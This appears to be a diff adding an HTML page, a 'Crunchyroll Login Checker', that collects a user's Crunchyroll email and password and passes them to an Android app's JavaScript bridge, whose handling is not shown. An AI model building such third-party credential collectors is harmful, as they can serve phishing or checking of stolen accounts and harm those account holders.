@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Crunchyroll Login Checker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+    input {
+      width: 80%;
+      padding: 10px;
+      margin-bottom: 15px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Crunchyroll Login Checker</h2>
+
+  <input type="text" id="email" placeholder="Email"><br>
+  <input type="password" id="password" placeholder="Password"><br>
+  <button onclick="sendCreds()">Check Login</button>
+
+  <script>
+    function sendCreds() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!email || !password) {
+        alert("Please fill both fields.");
+        return;
+      }
+
+      // Safely call Android interface if available
+      if (typeof AndroidInterface !== "undefined" && AndroidInterface.sendCredentials) {
+        AndroidInterface.sendCredentials(email, password);
+      } else {
+        alert("Android interface not available.");
+      }
+    }
+  </script>
+</body>
+</html>
